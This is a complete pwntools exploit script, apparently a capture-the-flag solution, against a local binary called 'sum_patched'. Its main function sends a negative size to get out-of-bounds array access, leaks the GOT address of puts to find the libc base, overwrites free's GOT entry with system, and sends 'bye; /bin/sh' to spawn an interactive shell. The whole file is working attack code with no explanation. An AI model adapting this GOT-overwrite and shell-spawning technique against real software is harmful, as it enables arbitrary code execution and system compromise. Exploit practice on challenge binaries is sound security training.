from pwn import *

exe = ELF("./sum_patched")
libc = ELF("./libc.so.6")

context.binary = exe

gdbscript = """
"""

# args.DEBUG = True

def conn():
    r = process([exe.path])
    if args.GDB:
        gdb.attach(r, gdbscript=gdbscript)

    return r

def leak_puts(r):
    r.sendlineafter(b"\n\n> ", f"get {exe.got.puts // 8}".encode())

    puts_leak = int(r.recvline().decode().strip())
    libc.address = puts_leak - libc.symbols.puts

def overwrite_free_with_system(r):
    r.sendlineafter(b"> ", f"set {exe.got.free // 8} {libc.symbols.system}".encode())

def main():
    r = conn()

    r.sendlineafter(b"?\n> ", b"-1")
    # r.sendlineafter(b"?\n> ", str(2 << 43).encode())
    
    leak_puts(r)
    overwrite_free_with_system(r)

    r.sendlineafter(b"> ", b"bye; /bin/sh")
    r.interactive()

if __name__ == "__main__":
    main()
